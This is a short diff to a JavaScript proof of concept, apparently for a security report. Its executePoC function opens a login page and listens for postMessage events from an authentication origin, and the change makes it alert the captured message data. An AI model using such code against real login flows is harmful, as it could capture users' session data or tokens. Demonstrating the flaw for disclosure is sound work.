@@ -18,7 +18,7 @@ function executePoC(){
     var x = window.open(loginurl);
     window.addEventListener('message',(e)=>{
         if (e.origin === "https://auth.externalbeta2.emaplan.com"){
-            alert(JSON.stringify(data));
+            alert(JSON.stringify(e.data));
         }        
     });
 }
